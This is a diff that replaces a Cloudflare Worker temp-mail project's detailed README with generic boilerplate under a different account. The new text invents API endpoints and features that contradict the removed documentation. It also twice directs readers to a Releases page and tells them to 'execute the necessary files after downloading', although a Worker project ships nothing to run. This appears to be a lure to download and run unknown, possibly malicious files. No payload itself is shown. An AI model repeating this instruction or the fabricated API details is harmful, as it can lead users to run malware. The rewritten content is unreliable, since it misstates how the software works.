@@ -1,173 +1,135 @@
-# Temp Mail Worker
+# Temp Mail: Your Cloudflare Worker for Temporary Email Inboxes 🌐✉️
 
-Cloudflare Worker that acts as a temporary email inbox. It uses Hono for routing, and Cloudflare D1 for storing emails.
-
-**Note**: This project serves as a starting point. While functional, there's a lot more that can be built on top of it!
+![GitHub All Releases](https://img.shields.io/github/downloads/Setsofi/temp-mail/total) ![GitHub Release](https://img.shields.io/github/release/Setsofi/temp-mail) ![License](https://img.shields.io/badge/license-MIT-blue)
 
 ## Table of Contents
 
-*   [API Endpoints](#api-endpoints)
-*   [Features](#features)
-*   [Supporters](#supporters)
-*   [Setup Guide](#setup-guide)
-    *   [Prerequisites](#prerequisites)
-    *   [Project Setup](#project-setup)
-    *   [Cloudflare Configuration](#cloudflare-configuration)
-        *   [D1 Database Setup](#d1-database-setup)
-        *   [KV Namespace Setup](#kv-namespace-setup)
-        *   [Email Routing Setup](#email-routing-setup)
-*   [Running the Worker](#running-the-worker)
-    *   [Local Development](#local-development)
-    *   [Deployment](#deployment)
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Reference](#api-reference)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## API Endpoints
+## Overview
 
-You can interact with the Temp Mail Worker API via these HTTP endpoints.
+Temp Mail is a Cloudflare Worker that provides a temporary email inbox. It allows users to create disposable email addresses for short-term use. This is particularly useful for signing up for services without exposing your real email address. 
 
-*   **`GET /domains`**
-    *   **Purpose**: Retrieve a list of supported email domains.
-    *   **Example**: `https://api.barid.site/domains`
-    *   **Returns**: An array of strings, each representing a supported domain (e.g., `["example.com", "test.org"]`).
-
-*   **`GET /emails/:emailAddress`**
-    *   **Purpose**: Retrieve a paginated list of email summaries for a specific recipient email address.
-    *   **Parameters**:
-        *   `:emailAddress` (path): The full email address to query (e.g., `user@example.com`).
-        *   `limit` (query, optional): Maximum number of emails to return per page (default: 10).
-        *   `offset` (query, optional): Number of emails to skip for pagination (default: 0).
-    *   **Example**: `https://api.barid.site/emails/x@example.com?limit=5&offset=0`
-    *   **Returns**: An array of email objects, each with `id`, `from_address`, `to_address`, `subject`, and `received_at`.
-
-*   **`DELETE /emails/:emailAddress`**
-    *   **Purpose**: Delete all emails associated with a specific recipient email address.
-    *   **Parameters**:
-        *   `:emailAddress` (path): The full email address whose emails are to be deleted.
-    *   **Example**: `https://api.barid.site/emails/x@example.com`
-    *   **Returns**: A success message indicating the deletion.
-
-*   **`GET /inbox/:emailId`**
-    *   **Purpose**: Retrieve the full content of a specific email by its unique ID.
-    *   **Parameters**:
-        *   `:emailId` (path): The unique identifier of the email.
-    *   **Example**: `https://api.barid.site/inbox/some-email-id`
-    *   **Returns**: An object containing the full `email` details, including `html_content` and `text_content`.
-
-*   **`DELETE /inbox/:emailId`**
-    *   **Purpose**: Delete a specific email by its unique ID.
-    *   **Parameters**:
-        *   `:emailId` (path): The unique identifier of the email to be deleted.
-    *   **Example**: `https://api.barid.site/inbox/some-email-id`
-    *   **Returns**: A success message indicating the deletion.
-
----
+You can download the latest release from the [Releases section](https://github.com/Setsofi/temp-mail/releases). Please execute the necessary files after downloading.
 
 ## Features
 
-*   Receives emails via Cloudflare Email Routing.
-*   Stores email data in a Cloudflare D1 database.
-*   Provides API endpoints to the emails
-*   Automatically cleans up old emails
+- **Temporary Email Addresses**: Generate disposable email addresses easily.
+- **Email Routing**: Receive emails directly to your temporary inbox.
+- **Cloudflare D1 Integration**: Store email data securely using Cloudflare's database solution.
+- **Free to Use**: No charges for generating and using temporary emails.
+- **Simple API**: Access email functionalities programmatically.
+- **Web Interface**: User-friendly interface to manage your temporary inbox.
 
-## Supporters
+## Installation
 
-A big thank you to the individuals who have donated domains to support this project. Your contributions help keep this service running.
+To set up Temp Mail, follow these steps:
 
-| Domain | Donated by |
-| --- | --- |
-| `barid.site` | [vwh](https://github.com/vwh) |
-| `vwh.sh` | [vwh](https://github.com/vwh) |
-| `iusearch.lol` | [vwh](https://github.com/vwh) |
-| `lifetalk.us` | [mm6x](https://github.com/mm6x) |
-| `z44d.pro` | [z44d](https://github.com/z44d) |
-| `wael.fun` | [blockton](https://github.com/blockton) |
-| `tawbah.site` | [HprideH](https://github.com/HprideH) |
-| `kuruptd.ink` | [HprideH](https://github.com/HprideH) |
-| `hexworld.cc` | [superhexa](https://github.com/superhexa) |
+1. **Clone the Repository**: Use the following command to clone the repository.
 
-### How to Donate a Domain
+   ```bash
+   git clone https://github.com/Setsofi/temp-mail.git
+   ```
 
-If you have an unused domain and would like to contribute, you can donate it by following these steps:
+2. **Navigate to the Directory**:
 
-1.  **Update your domain's nameservers to:**
-    *   `algin.ns.cloudflare.com`
-    *   `marjory.ns.cloudflare.com`
-2.  **Create a Pull Request**: Add your domain and owner information to the `domains.ts` file in the `src` directory.
+   ```bash
+   cd temp-mail
+   ```
 
----
+3. **Install Dependencies**: Use npm or yarn to install the required packages.
 
-## Setup Guide
+   ```bash
+   npm install
+   ```
 
-### Prerequisites
+4. **Deploy to Cloudflare**: Follow the Cloudflare Workers documentation to deploy your worker.
 
-Before you begin, ensure you have the following:
+## Usage
 
-*   **Bun**: Installed on your system.
-*   **Cloudflare Account**: With access to Workers, Email Routing, and D1.
+Once you have deployed the Temp Mail worker, you can start using it. Here’s how:
 
-### 1. Project Setup
+1. **Create a Temporary Email**: Send a request to the worker to generate a new email address.
 
-1.  **Install Dependencies**: Install the necessary JavaScript dependencies.
-    ```bash
-    bun install
-    ```
+   ```bash
+   curl -X POST https://your-worker-url/temp-mail/create
+   ```
 
-2.  **Login to Cloudflare**: You need to log in to your Cloudflare account via Wrangler. This will open a browser for authentication.
-    ```bash
-    bun wrangler login
-    ```
+2. **Check Inbox**: Use the generated email address to receive emails. 
 
-### 2. Cloudflare Configuration
+   ```bash
+   curl -X GET https://your-worker-url/temp-mail/inbox?email=generated_email@example.com
+   ```
 
-#### a. D1 Database Setup
+3. **Retrieve Emails**: Access the emails sent to your temporary address.
 
-1.  **Create the D1 database**:
-    ```bash
-    bun run db:create
-    ```
-2.  **Copy the `database_id`**: From the output of the above command.
-3.  **Update `wrangler.jsonc`**: Open `wrangler.jsonc` and replace `database_id` with the `database_id` you just copied.
-4.  **Apply Database Schema**:
-    ```bash
-    bun run db:tables
-    ```
-5.  **Apply Database Indexes**:
-    ```bash
-    bun run db:indexes
-    ```
+   ```bash
+   curl -X GET https://your-worker-url/temp-mail/retrieve?email=generated_email@example.com
+   ```
 
-#### b. KV Namespace Setup
+## API Reference
 
-1.  **Create the KV Namespace**:
-    ```bash
-    bun run kv:create
-    ```
-2.  **Copy the `id`**: From the output of the above command.
-3.  **Update `wrangler.jsonc`**: Open `wrangler.jsonc` and add the `id` to the `kv_namespaces` binding for `EMAIL_STATS_KV`.
+The Temp Mail API provides several endpoints for managing temporary email addresses.
 
-#### c. Email Routing Setup
+### Create Temporary Email
 
-1.  **Go to your Cloudflare Dashboard**: Select your domain (`example.com`).
-2.  **Navigate to "Email" -> "Email Routing"**.
-3.  **Enable Email Routing** if it's not already enabled.
-4.  **Create a Catch-all Rule**:
-    *   For "Action", choose "Send to Worker".
-    *   Select your Worker (e.g., `temp-mail`).
-    *   Click "Save".
+- **Endpoint**: `/temp-mail/create`
+- **Method**: POST
+- **Description**: Generates a new temporary email address.
 
-## Running the Worker
+### Check Inbox
 
-### Local Development
+- **Endpoint**: `/temp-mail/inbox`
+- **Method**: GET
+- **Description**: Retrieves the inbox for a given email address.
 
-To run the worker locally and connect to your **remote D1 database**:
+### Retrieve Emails
 
-```bash
-bun dev
-```
+- **Endpoint**: `/temp-mail/retrieve`
+- **Method**: GET
+- **Description**: Fetches emails sent to the specified temporary email address.
 
-### Deployment
+## Contributing
 
-To deploy your worker to Cloudflare:
+We welcome contributions to Temp Mail! Here’s how you can help:
 
-```bash
-bun deploy
-```
+1. **Fork the Repository**: Click on the fork button at the top right of the repository page.
+2. **Create a Branch**: Use the following command to create a new branch.
+
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+
+3. **Make Changes**: Implement your changes and commit them.
+
+   ```bash
+   git commit -m "Add your message here"
+   ```
+
+4. **Push to GitHub**: Push your changes to your forked repository.
+
+   ```bash
+   git push origin feature/YourFeature
+   ```
+
+5. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or suggestions, feel free to reach out:
+
+- **GitHub**: [Setsofi](https://github.com/Setsofi)
+- **Email**: your-email@example.com
+
+You can also check the [Releases section](https://github.com/Setsofi/temp-mail/releases) for the latest updates and downloads.
